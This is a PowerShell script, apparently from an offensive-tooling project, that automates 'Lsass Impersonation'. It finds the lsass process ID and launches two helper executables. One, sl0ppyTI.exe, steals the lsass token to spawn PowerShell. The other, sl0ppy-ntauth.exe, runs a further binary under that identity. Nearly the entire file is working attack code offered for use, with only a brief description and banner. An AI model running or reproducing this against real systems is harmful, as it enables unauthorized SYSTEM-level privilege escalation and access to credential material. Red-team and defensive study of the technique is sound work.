<#
.SYNOPSIS
This script performs Lsass Impersonation using sl0ppy-TokenStealer and sl0ppy-ntauth.
.DESCRIPTION
The script first changes the current directory to the specified path. It then gets the process ID of lsass and runs sl0ppy-TokenStealer with the appropriate arguments. After a brief pause, it gets the lsass process ID again and runs sl0ppy-ntauth.
.NOTES
Author: P.Hoogeveem (x0xr00t)
#>

# Display banner
Write-Host " {sl0p}----sl0ppyr00t----{sl0p}"
Write-Host " {sl0p}Lsass Impersonation{sl0p}"
Write-Host " {sl0p}----sl0ppyr00t----{sl0p}"
Write-Host ""
Write-Host ""

# Change the current directory
$scriptPath = 'C:\Users\x0\Desktop\ALPI\sl0ppy-TokenStealer'
Set-Location -Path $scriptPath

# Sleep function with display
function SleepWithMessage {
    param(
        [int]$Seconds,
        [string]$Message
    )

    Write-Host $Message
    Start-Sleep -Seconds $Seconds
}

# Get the lsass process ID
$lsassProcess = Get-Process -Name lsass

if ($lsassProcess) {
    $lsassProcessID = $lsassProcess.Id

    # Run sl0ppy-TokenStealer with appropriate arguments
    Write-Host "Running sl0ppy-TokenStealer..."
    Start-Process -FilePath 'powershell' -ArgumentList "./sl0ppyTI.exe pid:$lsassProcessID binary:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

    # Sleep for a few seconds
    SleepWithMessage -Seconds 5 -Message "Waiting for sl0ppy-TokenStealer to finish..."

    # Get the lsass process ID again
    $lsassProcess = Get-Process -Name lsass

    if ($lsassProcess) {
        $lsassProcessID = $lsassProcess.Id

        # Run sl0ppy-ntauth with appropriate arguments
        Write-Host "Running sl0ppy-ntauth..."
        Start-Process -FilePath 'powershell' -ArgumentList "./sl0ppy-ntauth.exe pid:$lsassProcessID binary:C:\Users\x0\Desktop\ALPI\sl0ppy-ntc.exe"
    }
    else {
        Write-Host "Error: lsass process not found."
    }
}
else {
    Write-Host "Error: lsass process not found."
}
